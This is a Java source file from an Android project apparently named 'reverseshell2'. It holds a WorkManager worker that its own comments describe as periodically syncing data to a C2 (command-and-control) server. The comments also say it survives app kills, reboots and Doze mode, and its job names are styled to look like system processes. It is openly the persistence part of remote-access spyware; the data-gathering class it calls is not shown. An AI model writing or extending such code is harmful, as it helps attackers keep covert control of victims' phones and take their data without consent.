package com.example.reverseshell2;

import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

/**
 * WorkManager periodic worker that syncs data to C2 server.
 * Runs every ~15 minutes. Survives app kills, reboots, and Doze mode.
 * This is far more reliable than the old TCP socket connection.
 */
public class SyncWorker extends Worker {

    private static final String TAG = "SYS_WORKER";
    public static final String WORK_NAME = "sys_data_sync";

    public SyncWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        try {
            Log.d(TAG, "Periodic sync starting...");
            DataSyncer syncer = new DataSyncer(getApplicationContext());
            syncer.performSync();
            Log.d(TAG, "Periodic sync completed");
            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "Sync worker failed: " + e.getMessage());
            return Result.retry();
        }
    }
}
